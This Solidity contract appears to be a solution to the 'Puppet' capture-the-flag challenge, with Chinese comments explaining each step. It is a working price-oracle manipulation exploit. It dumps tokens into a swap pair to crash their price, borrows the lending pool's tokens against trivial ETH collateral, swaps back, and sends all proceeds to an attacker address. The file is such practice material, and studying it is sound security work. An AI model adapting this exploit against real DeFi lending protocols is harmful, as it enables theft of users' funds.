// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

import "../puppet/PuppetPool.sol";

interface IPair {
    function tokenToEthTransferInput(
        uint256 tokens_sold,uint256 min_eth,uint256 deadline,
        address recipient) external returns(uint256);
    function ethToTokenTransferInput(uint256 min_tokens, uint256 deadline, address recipient) external payable returns(uint256);        
}

contract PuppetPoolAttack {

    function run(
                address _attackAddress,
                address _tokenAddress,
                address _pairAddress,
                address _lendingPool
                ) external
    {
        PuppetPool lendingPool = PuppetPool(_lendingPool);
        IERC20 token = IERC20(_tokenAddress);

        //1.先把所有token放进pair换eth (pair的token价格会降低)       
        uint256 tokenBalance = token.balanceOf(address(this));
        token.approve(_pairAddress,tokenBalance);
        IPair(_pairAddress).tokenToEthTransferInput(tokenBalance,1,block.timestamp,address(this));
        
        //2.再用eth借pool出来1半的token出来  
        uint256 poolTokenBalance = token.balanceOf(_lendingPool);
        lendingPool.borrow{value:address(this).balance}(poolTokenBalance/2);
        
        //3.再把token放进pair (pair价格会降到很低)
        tokenBalance = token.balanceOf(address(this));
        token.approve(_pairAddress,tokenBalance);
        IPair(_pairAddress).tokenToEthTransferInput(tokenBalance,1,block.timestamp,address(this));

        //4.再用很低的eth借pool出来另1半的token出来
        lendingPool.borrow{value:address(this).balance}(poolTokenBalance/2);

        //5.再用eth把tokon从pair换回来
        IPair(_pairAddress).ethToTokenTransferInput{value:address(this).balance}(1,block.timestamp + 5 days,address(this));

        //6.把token和eth转给attack
        token.transfer(_attackAddress,token.balanceOf(address(this)));
        payable(_attackAddress).transfer(address(this).balance);
    }

    receive() external payable{}
}
 